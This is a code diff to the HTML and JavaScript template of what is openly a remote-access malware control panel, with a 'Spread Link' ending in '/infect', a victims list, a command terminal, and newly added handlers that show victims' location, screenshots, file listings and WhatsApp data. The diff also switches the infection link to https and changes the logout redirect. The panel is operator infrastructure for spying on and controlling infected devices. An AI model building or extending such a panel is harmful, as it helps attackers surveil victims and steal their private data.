@@ -27,7 +27,7 @@
             <hr class="border-secondary">
             <div class="mb-3">
                 <label class="text-muted small">Spread Link</label>
-                <input id="spreadLink" class="form-control form-control-sm bg-dark text-light border-secondary" value="http://{{ ip }}/infect" readonly>
+                <input id="spreadLink" class="form-control form-control-sm bg-dark text-light border-secondary" value="https://{{ ip }}/infect" readonly>
                 <button class="btn btn-sm btn-outline-info mt-1" onclick="navigator.clipboard.writeText(document.getElementById('spreadLink').value)">Copy</button>
             </div>
             <h6>Victims (<span id="vCount">0</span>)</h6>
@@ -89,6 +89,11 @@ socket.on('command_result', (data) => {
         term.scrollTop = term.scrollHeight;
     }
 });
+socket.on('location_update', (data) => { document.getElementById('locDisplay').innerText = data; });
+socket.on('screenshot_update', (data) => { document.getElementById('imgDisplay').src = data; document.getElementById('imgDisplay').style.display = 'block'; });
+socket.on('file_list', (data) => { document.getElementById('fileList').innerText = data; });
+socket.on('whatsapp_result', (data) => { document.getElementById('waOut').innerText = data; });
+
 function updateVictims(ids) {
     const list = document.getElementById('victimList');
     list.innerHTML = '';
@@ -115,7 +120,7 @@ function sendCmd(cmd, arg) {
 socket.emit('get_victims');
 function logout() {
     document.cookie.split(";").forEach(c => document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"));
-    window.location.href = '/login';
+    window.location.href = '/logout';
 }
 </script>
 </body>
